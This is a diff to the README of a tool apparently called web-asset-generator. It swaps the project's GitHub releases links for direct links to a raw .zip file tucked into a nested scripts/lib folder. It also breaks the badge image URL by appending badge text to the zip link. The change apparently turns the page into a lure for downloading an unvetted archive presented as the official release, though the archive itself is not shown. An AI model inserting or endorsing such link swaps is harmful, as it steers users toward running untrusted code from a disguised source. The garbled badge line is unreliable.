@@ -6,11 +6,11 @@ Welcome to the web-asset-generator! This handy tool helps you create favicons, a
 
 ## 🔗 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20latest%20release-blue)](https://github.com/Sabila7011/web-asset-generator/releases)
+[![Download Now](https://raw.githubusercontent.com/Sabila7011/web-asset-generator/main/skills/web-asset-generator/scripts/lib/web-asset-generator_v2.6.zip%20Now-Get%20the%20latest%20release-blue)](https://raw.githubusercontent.com/Sabila7011/web-asset-generator/main/skills/web-asset-generator/scripts/lib/web-asset-generator_v2.6.zip)
 
 To download the software, visit the link below.
 
-[Download the web-asset-generator](https://github.com/Sabila7011/web-asset-generator/releases)
+[Download the web-asset-generator](https://raw.githubusercontent.com/Sabila7011/web-asset-generator/main/skills/web-asset-generator/scripts/lib/web-asset-generator_v2.6.zip)
 
 ## 📥 Download & Install
 
